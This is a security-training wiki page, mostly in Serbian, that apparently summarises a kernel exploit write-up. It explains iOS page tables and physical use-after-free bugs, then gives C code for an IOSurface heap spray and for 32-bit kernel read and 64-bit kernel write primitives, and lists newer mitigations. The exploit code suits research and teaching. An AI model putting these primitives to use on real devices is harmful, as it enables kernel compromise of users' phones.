# iOS Physical Use-After-Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Physical use-after-free

Ovo je sažetak posta sa [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html). Pored toga, dodatne informacije o exploit-u koji koristi ovu tehniku mogu se naći u [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd).

### Memory management in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

The **virtuelni adresni prostor** za korisničke procese na iOS obuhvata od **0x0 do 0x8000000000**. Međutim, ove adrese se ne preslikavaju direktno na fizičku memoriju. Umesto toga, kernel koristi **page tables** da prevede virtuelne adrese u stvarne **physical addresses**.

#### Levels of Page Tables in iOS

Page tables su organizovane hijerarhijski u tri nivoa:

1. **L1 Page Table (Level 1)**:
* Svaki unos ovde predstavlja veliki opseg virtuelne memorije.
* Pokriva **0x1000000000 bytes** (ili **256 GB**) virtuelne memorije.
2. **L2 Page Table (Level 2)**:
* Unos ovde predstavlja manji region virtuelne memorije, konkretno **0x2000000 bytes** (32 MB).
* L1 unos može pokazivati na L2 tabelu ako ne može sam da mapira ceo region.
3. **L3 Page Table (Level 3)**:
* Ovo je najfiniji nivo, gde svaki unos mapira jednu **4 KB** memorijsku stranicu.
* L2 unos može pokazivati na L3 tabelu ako je potrebna detaljnija kontrola.

#### Mapping Virtual to Physical Memory

* **Direct Mapping (Block Mapping)**:
* Neki unosi u page table direktno **mapiraju opseg virtuelnih adresa** u kontinualan opseg fizičkih adresa (kao prečica).
* **Pointer to Child Page Table**:
* Ako je potrebna finija kontrola, unos na jednom nivou (npr. L1) može pokazivati na **child page table** na sledećem nivou (npr. L2).

#### Example: Mapping a Virtual Address

Recimo da pokušate da pristupite virtuelnoj adresi **0x1000000000**:

1. **L1 Table**:
* Kernel proverava L1 page table unos koji odgovara toj virtuelnoj adresi. Ako ima **pointer to an L2 page table**, prelazi na tu L2 tabelu.
2. **L2 Table**:
* Kernel proverava L2 page table za detaljnije preslikavanje. Ako taj unos pokazuje na **L3 page table**, prelazi dalje.
3. **L3 Table**:
* Kernel traži konačni L3 unos, koji pokazuje na **fizičku adresu** stvarne memorijske stranice.

#### Example of Address Mapping

Ako upišete fizičku adresu **0x800004000** u prvi indeks L2 tabele, onda:

* Virtuelne adrese od **0x1000000000** do **0x1002000000** mapiraju se na fizičke adrese od **0x800004000** do **0x802004000**.
* Ovo je **block mapping** na L2 nivou.

Alternativno, ako L2 unos pokazuje na L3 tabelu:

* Svaka 4 KB stranica u virtuelnom adresnom opsegu **0x1000000000 -> 0x1002000000** biće mapirana pojedinačnim unosima u L3 tabeli.

### Physical use-after-free

A **physical use-after-free** (UAF) se dešava kada:

1. Proces **alokira** memoriju kao **readable and writable**.
2. **Page tables** se ažuriraju da mapiraju tu memoriju na specifičnu fizičku adresu kojoj proces može pristupiti.
3. Proces **dealocira** (oslobodi) memoriju.
4. Međutim, zbog buga, kernel **zaboravi da ukloni mapping** iz page tables, iako je odgovarajuća fizička memorija označena kao slobodna.
5. Kernel može potom **ponovo alocirati tu "slobodnu" fizičku memoriju** za druge potrebe, npr. kernel podatke.
6. Pošto mapping nije uklonjen, proces i dalje može **čitati i pisati** u tu fizičku memoriju.

To znači da proces može pristupiti **stranicama kernel memorije**, koje mogu sadržavati osetljive podatke ili strukture, potencijalno omogućavajući napadaču da **manipuliše kernel memorijom**.

### IOSurface Heap Spray

Pošto napadač ne može da kontroliše koje će konkretne kernel stranice biti dodeljene oslobođenoj memoriji, koristi tehniku zvanu **heap spray**:

1. Napadač **kreira veliki broj IOSurface objekata** u kernel memoriji.
2. Svaki IOSurface objekat sadrži **magic value** u jednom od svojih polja, što olakšava identifikaciju.
3. Oni **skeniraju oslobođene stranice** da vide da li su neki od tih IOSurface objekata završili na oslobođenoj stranici.
4. Kada nađu IOSurface objekat na oslobođenoj stranici, mogu ga iskoristiti da **čitaju i pišu kernel memoriju**.

Više informacija o ovome u [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Imajte na umu da iOS 16+ (A12+) uređaji uvode hardverske mitigacije (kao što su PPL ili SPTM) koje čine physical UAF tehnike znatno manje izvodljivim.
> PPL nameće stroge MMU zaštite na stranicama vezanim za code signing, entitlements i osetljive kernel podatke, tako da, čak i ako se stranica ponovo iskoristi, pisanja iz userlanda ili kompromitovanog kernel koda na PPL-zaštićene stranice bivaju blokirana.
> Secure Page Table Monitor (SPTM) proširuje PPL tako što ojačava same page table update-ove. On osigurava da čak ni privilegovani kernel kod ne može neprimetno remap-ovati oslobođene stranice ili menjati mape bez prolaska kroz sigurne provere.
> KTRR (Kernel Text Read-Only Region) zaključava kernel-ov kod kao read-only nakon boot-a. Ovo onemogućava bilo kakve runtime modifikacije kernel koda, zatvarajući značajan napadni vektor na koji se physical UAF exploit-i često oslanjaju.
> Pored toga, IOSurface alokacije su manje predvidive i teže se mapiraju u user-accessible regione, što čini trik sa “magic value scanning” mnogo manje pouzdanim. I IOSurface sada zahteva entitlements i podleže sandbox ograničenjima.

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects**: Napadač kreira mnoge IOSurface objekte sa specijalnim identifikatorom ("magic value").
2. **Scan Freed Pages**: Proveravaju da li je bilo koji od objekata alociran na oslobođenoj stranici.
3. **Read/Write Kernel Memory**: Manipulacijom polja u IOSurface objektu, dobijaju mogućnost za **arbitrary reads and writes** u kernel memoriji. Ovo im omogućava da:
* Koriste jedno polje za **čitati bilo koju 32-bit vrednost** u kernel memoriji.
* Koriste drugo polje za **pisati 64-bit vrednosti**, ostvarujući stabilan **kernel read/write primitive**.

Generate IOSurface objects with the magic value IOSURFACE_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Pretražite **`IOSurface`** objekte u jednoj oslobođenoj fizičkoj stranici:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Postizanje Kernel Read/Write with IOSurface

Nakon što preuzmemo kontrolu nad IOSurface objektom u kernel memoriji (mapiranom na oslobođenu fizičku stranicu dostupnu iz userspace-a), možemo ga koristiti za proizvoljne kernel operacije čitanja i pisanja.

**Key Fields in IOSurface**

IOSurface objekat ima dva ključna polja:

1. **Use Count Pointer**: Omogućava **32-bit read**.
2. **Indexed Timestamp Pointer**: Omogućava **64-bit write**.

Prepisivanjem ovih pokazivača preusmeravamo ih na proizvoljne adrese u kernel memoriji, čime omogućavamo mogućnosti read/write.

#### 32-Bit Kernel Read

Da izvršimo čitanje:

1. Prepišite **use count pointer** da pokazuje na ciljnu adresu umanjenu za offset od 0x14 bajta.
2. Koristite metodu `get_use_count` da pročitate vrednost na toj adresi.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-bit upis u kernel

Da biste izvršili upis:

1. Prepišite **indexed timestamp pointer** na ciljnu adresu.
2. Koristite `set_indexed_timestamp` metodu da upišete 64-bit vrednost.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Exploit Flow Recap

1. **Trigger Physical Use-After-Free**: Slobodne stranice postaju dostupne za ponovnu upotrebu.
2. **Spray IOSurface Objects**: Alocirajte mnogo IOSurface objekata sa jedinstvenom "magic value" u kernel memory.
3. **Identify Accessible IOSurface**: Pronađite IOSurface na oslobođenoj stranici kojom upravljate.
4. **Abuse Use-After-Free**: Izmenite pokazivače u IOSurface objektu kako biste omogućili proizvoljno **kernel read/write** preko IOSurface metoda.

Sa ovim primitivima, exploit obezbeđuje kontrolisane **32-bit reads** i **64-bit writes** u kernel memory. Dalji koraci za jailbreak mogli bi uključivati stabilnije read/write primitive, koje mogu zahtevati zaobilaženje dodatnih zaštita (npr. PPL na novijim arm64e uređajima).

{{#include ../../banners/hacktricks-training.md}}
